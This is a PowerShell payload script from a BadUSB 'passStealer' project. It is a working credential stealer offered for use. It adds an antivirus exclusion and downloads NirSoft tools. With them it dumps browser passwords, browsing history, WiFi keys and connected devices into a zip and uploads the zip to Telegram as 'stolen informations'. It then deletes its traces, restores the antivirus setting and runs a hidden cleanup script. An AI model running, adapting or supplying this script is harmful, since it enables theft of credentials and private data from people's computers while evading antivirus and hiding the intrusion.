#                      _                        
#  _   _  ___  _   _  | | ___ __   _____      __
# | | | |/ _ \| | | | | |/ /  _ \ / _ \ \ /\ / /
# | |_| | (_) | |_| |_|   <| | | | (_) \ V  V / 
#  \__, |\___/ \__,_(_)_|\_\_| |_|\___/ \_/\_/  
#  |___/                                        
Set-Location C:\Users\Public\Documents #Go to the folder in which we will download files
Add-MpPreference -ExclusionExtension exe -Force #Add exception for .exe files in antivirus
mkdir dump #Create dump/ directory to put all informations that we'll steal in it
Invoke-WebRequest https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/upload/fin_upload.ps1 -OutFile fin_upload.ps1 #Download final .ps1 file to delete all .txt files and stop all powershell process
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe #Download the nirsoft tool for Browserhistory
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe #Download the nirsoft tool for connected devces
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe #Download the nirsoft tool for WiFi passwords
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe #Download the nirsoft tool for Browser passwords
Invoke-WebRequest LINK -OutFile telegram_uploader.exe #Download uploader file to upload all informations on telegram
.\WebBrowserPassView.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt #Create the file for Browser passwords
.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_history.txt #Create the file for Browser history
.\WirelessKeyView.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_wifi.txt #Create the file for WiFi passwords
.\WNetWatcher.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_connected_devices.txt #Create the file for connected devices
Start-Sleep -Seconds 60 #Wait for 60 seconds (because connected devices file take a minute to be created)
Move-Item -Path "$env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt", "$env:USERNAME-$(get-date -f yyyy-MM-dd)_history.txt", "$env:USERNAME-$(get-date -f yyyy-MM-dd)_wifi.txt", "$env:USERNAME-$(get-date -f yyyy-MM-dd)_connected_devices.txt" -Destination dump/
Compress-Archive dump/ dump.zip #Compress dump/ folder to upload it on telegram
./telegram_uploader.exe -f dump.zip -c "Here are all stolen informations !" #Upload dump.zip on telegram
Start-Sleep -Seconds 15 #Wait 15 seconds
Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process #Kill all powershell process except the one running
Start-Sleep -Seconds 30 #Wait 30 seconds
#Delete nirsoft tools and .ps1 file
Remove-Item BrowsingHistoryView.exe
Remove-Item WNetWatcher.exe
Remove-Item WNetWatcher.cfg
Remove-Item WirelessKeyView.exe
Remove-Item WebBrowserPassView.exe
Remove-Item ciaoV2_upload.ps1
Remove-Item telegram_uploader.exe
#Enable and disable capslock to know when you can eject BadUSB
$keyBoardObject = New-Object -ComObject WScript.Shell
$keyBoardObject.SendKeys("{CAPSLOCK}")
Start-Sleep -Seconds 1 #Wait 2 seconds
$keyBoardObject.SendKeys("{CAPSLOCK}")
Start-Sleep -Seconds 1 #Wait 2 seconds
$keyBoardObject.SendKeys("{CAPSLOCK}")
Start-Sleep -Seconds 1 #Wait 2 seconds
$keyBoardObject.SendKeys("{CAPSLOCK}")
Remove-MpPreference -ExclusionExtension exe -Force #Reset antivirus exception
powershell.exe -noexit -windowstyle hidden -file fin_upload.ps1 #Start final .ps1 file to delete all .txt files (because in this .ps1 .txt files are considerated in-use
exit #End .ps1 file
